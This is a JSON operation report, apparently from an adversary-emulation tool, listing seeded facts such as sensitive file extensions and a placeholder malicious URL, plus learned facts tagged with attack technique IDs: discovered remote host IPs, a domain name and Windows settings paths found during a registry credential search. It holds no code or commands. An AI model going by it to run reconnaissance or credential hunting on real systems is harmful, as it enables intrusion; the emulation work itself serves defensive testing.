+  "planner": "atomic",
+  "adversary": {
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "description": "an empty adversary profile",
+    "has_repeatable_abilities": false,
+    "tags": [],
+    "plugin": "",
+    "name": "ad-hoc",
+    "adversary_id": "ad-hoc",
+    "atomic_ordering": []
+  },
+  "jitter": "2/8",
+  "objectives": {
+    "description": "This is a default objective that runs forever.",
+    "goals": [
+      {
+        "count": 1048576,
+        "target": "exhaustion",
+        "operator": "==",
+        "value": "complete",
+        "achieved": false
+      }
+    ],
+    "percentage": 0,
+    "name": "default",
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc"
+  },
+  "facts": [
+    {
+      "trait": "file.sensitive.extension",
+      "limit_count": -1,
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "unique": "file.sensitive.extensionwav",
+      "technique_id": "",
+      "created": "2023-03-18T00:15:55Z",
+      "score": 1,
+      "name": "file.sensitive.extension",
+      "value": "wav",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "relationships": [],
+      "links": []
+    },
+    {
+      "trait": "file.sensitive.extension",
+      "limit_count": -1,
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "unique": "file.sensitive.extensionyml",
+      "technique_id": "",
+      "created": "2023-03-18T00:15:55Z",
+      "score": 1,
+      "name": "file.sensitive.extension",
+      "value": "yml",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "relationships": [],
+      "links": []
+    },
+    {
+      "trait": "file.sensitive.extension",
+      "limit_count": -1,
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "unique": "file.sensitive.extensionpng",
+      "technique_id": "",
+      "created": "2023-03-18T00:15:55Z",
+      "score": 1,
+      "name": "file.sensitive.extension",
+      "value": "png",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "relationships": [],
+      "links": []
+    },
+    {
+      "trait": "server.malicious.url",
+      "limit_count": -1,
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "unique": "server.malicious.urlkeyloggedsite.com",
+      "technique_id": "",
+      "created": "2023-03-18T00:15:55Z",
+      "score": 1,
+      "name": "server.malicious.url",
+      "value": "keyloggedsite.com",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "relationships": [],
+      "links": []
+    },
+    {
+      "trait": "remote.host.ip",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "remote.host.ip192.168.122.68",
+      "technique_id": "T1018",
+      "created": "2023-03-18T01:12:00Z",
+      "score": 1,
+      "name": "remote.host.ip",
+      "value": "192.168.122.68",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "remote.host.ip(192.168.122.68)"
+      ],
+      "links": [
+        "dc40f183-f3ec-4e73-99a4-d2275497be90"
+      ]
+    },
+    {
+      "trait": "remote.host.ip",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "remote.host.ip192.168.122.197",
+      "technique_id": "T1018",
+      "created": "2023-03-18T01:12:00Z",
+      "score": 1,
+      "name": "remote.host.ip",
+      "value": "192.168.122.197",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "remote.host.ip(192.168.122.197)"
+      ],
+      "links": [
+        "dc40f183-f3ec-4e73-99a4-d2275497be90"
+      ]
+    },
+    {
+      "trait": "remote.host.ip",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "remote.host.ip224.0.0.22",
+      "technique_id": "T1018",
+      "created": "2023-03-18T01:12:00Z",
+      "score": 1,
+      "name": "remote.host.ip",
+      "value": "224.0.0.22",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "remote.host.ip(224.0.0.22)"
+      ],
+      "links": [
+        "dc40f183-f3ec-4e73-99a4-d2275497be90"
+      ]
+    },
+    {
+      "trait": "remote.host.ip",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "remote.host.ip224.0.0.251",
+      "technique_id": "T1018",
+      "created": "2023-03-18T01:12:00Z",
+      "score": 1,
+      "name": "remote.host.ip",
+      "value": "224.0.0.251",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "remote.host.ip(224.0.0.251)"
+      ],
+      "links": [
+        "dc40f183-f3ec-4e73-99a4-d2275497be90"
+      ]
+    },
+    {
+      "trait": "remote.host.ip",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "remote.host.ip224.0.0.252",
+      "technique_id": "T1018",
+      "created": "2023-03-18T01:12:00Z",
+      "score": 1,
+      "name": "remote.host.ip",
+      "value": "224.0.0.252",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "remote.host.ip(224.0.0.252)"
+      ],
+      "links": [
+        "dc40f183-f3ec-4e73-99a4-d2275497be90"
+      ]
+    },
+    {
+      "trait": "remote.host.ip",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "remote.host.ip239.255.255.250",
+      "technique_id": "T1018",
+      "created": "2023-03-18T01:12:00Z",
+      "score": 1,
+      "name": "remote.host.ip",
+      "value": "239.255.255.250",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "remote.host.ip(239.255.255.250)"
+      ],
+      "links": [
+        "dc40f183-f3ec-4e73-99a4-d2275497be90"
+      ]
+    },
+    {
+      "trait": "network.domain.name",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "network.domain.nameWORKGROUP",
+      "technique_id": "T1016",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "network.domain.name",
+      "value": "WORKGROUP",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [
+        "network.domain.name(WORKGROUP)"
+      ],
+      "links": [
+        "2c953fba-4eb7-4c95-b7d7-6bab95729b72"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SettingsPageAccountsManage/HighKeywords}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SettingsPageAccountsManage/HighKeywords}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/Description}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/Description}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/HighKeywords}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/HighKeywords}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_ChangePassword/Description}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_ChangePassword/Description}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_ChangePassword/HighKeywords}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_ChangePassword/HighKeywords}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PicturePassword/Description}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PicturePassword/Description}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PicturePassword/HighKeywords}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PicturePassword/HighKeywords}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PINPassword/Description}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PINPassword/Description}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    },
+    {
+      "trait": "host.file.path",
+      "limit_count": -1,
+      "collected_by": [
+        "mjicsx"
+      ],
+      "origin_type": "LEARNED",
+      "unique": "host.file.path//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PINPassword/HighKeywords}",
+      "technique_id": "T1552.002",
+      "created": "2023-03-18T01:13:35Z",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "//Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PINPassword/HighKeywords}",
+      "source": "4b19e729-e817-4ee9-9c20-3bd1eac3c880",
+      "relationships": [],
+      "links": [
+        "9267b269-47bb-46cb-9905-ddcf1cd3d50f"
+      ]
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "mjicsx": []
+    },
+    {
+      "rojqgq": []
+    }
+  ]
+}
